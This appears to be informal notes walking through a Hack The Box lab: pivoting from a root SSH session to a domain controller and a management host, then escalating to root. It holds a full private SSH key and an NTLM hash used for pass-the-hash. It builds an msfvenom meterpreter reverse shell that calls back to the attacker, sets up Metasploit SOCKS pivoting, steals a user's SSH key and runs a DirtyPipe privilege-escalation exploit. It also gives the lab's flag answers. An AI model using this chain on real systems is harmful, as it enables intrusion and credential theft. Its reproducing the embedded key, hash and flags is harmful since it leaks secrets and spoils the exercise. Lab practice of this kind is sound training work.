jsut assuming we will need thsi as well here: 

-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----





Question 1 - Gain access to the MGMT01 host and submit the contents of the flag.txt file in a user's home directory. - 3c4996521690cc76446894da2bf7dd8f 
1) ssh -i rootkey -L 5985:172.16.8.3:5985 root@10.129.214.84
2) for reverse port forwarding -> ssh -i rootkey -R 1234:10.10.15.252:8443 root@10.129.214.84
3) now in a sudo su KALI terminal -> evil-winrm -i 127.0.0.1 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2 
4) on evil-winrm run -> ipconfig /all -> we see the 172.16.8 and 172.16.9 subnet 
5) lets run a ping sweep for the 172.16.9.0/23 subnet -> 1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
6) we fianlly get a true output for 172.16.9.25 
7) make msfvenom shell -> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234 *!*!*!*! IMPORTANT!!!!*!*!*! MAKE SURE LPORT IS THE SAME PORT AS IN STEP NUMBER 2 FOR REVERSE PORT FORWARDING OTHERWISE SHELL WILL NOT WORK!!!!!!!!! 
8) on evil-winrm shell run -> upload "/home/htb-ac-1235531/Desktop/dc_shell"
9) back on normal Kali shell -> ALSO IMPORTANT MAKE SURE THIS LPORT IS THE SAME AS STEP NUMBER 2 ON THE BACKEND OF OUR IP 
msfconsole -q
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8443
run
10) on evil-winRM shell -> .\dc_shell.exe
11) should have meterpreter shell caught. 
12) on meterpreter -> run autoroute -s 172.16.9.0/23 
13) now were going to background this shell and add proxy server... so in the meterpreter shell -> 

bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run

14) Afterward, students need to test the SOCKS proxy server and pivoting setup by running an Nmap scan from Pwnbox/PMVPN to 172.16.9.25:

aye dawg this shit never works but heres what we are finna do on a regular KALI term

15) proxychains nmap -sT -p 22 172.16.9.25
 we see on the walkthrough theres an open port of 22 
16) Now that the host is reachable, students need to enumerate DC01, which they connected to using Evil-WinRM, to discover that the SSH private key of the user ssmallsadm can be found under the directory C:\Department Shares\IT\Private\Networking\, thus, they need to download it:

17) on Evil-WinRM were going to cd -> C:\Department Shares\IT\Private\Networking
18) once in the directory -> download ssmallsadm-id_rsa ./ssmalls
19) so back on our kali desktop we have ssmalls id rsa key 
20) chmod 600 ssmalls 
21) proxychains ssh -i ssmalls ssmallsadm@172.16.9.25
22) ls -> cat flag.txt -> 3c4996521690cc76446894da2bf7dd8f  

ill say holy shit... proxychains nmap not working then proxychains ssh working killed me... but we made it. 



Question 2 - Escalate privileges to root on the MGMT01 host. Submit the contents of the flag.txt file in the /root directory. - 206c03861986c0e264438cb6e8e90a19 
1) all this is from the section... otherwise i wouldnt know wtf to do : ] 
2) first clone the CVE-2022-0847-DirtyPipe-Exploits on Pwnbox/PMVPN and copy "exploit-2.c" to the clipboard so that they can paste it in a file inside MGMT01:
3) ON KALI  
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits/
cat exploit-2.c | xclip -se c
4) so ok... with this we will have the exploit copied to our keybaord.. .
5) ON SSMALLS SSH SESSION!! -> vim exploit.c -> paste keyboard -> :wq! 
6) still on ssmalls ssh -> 
gcc exploit.c -o dirtypipe
chmod +x dirtypipe
7) find / -perm -4000 2>/dev/null
8) output: /usr/lib/openssh/ssh-keysign
9) still on ssmall ssh -> ./dirtypipe /usr/lib/openssh/ssh-keysign
10) cat /root/flag.txt -> 206c03861986c0e264438cb6e8e90a19


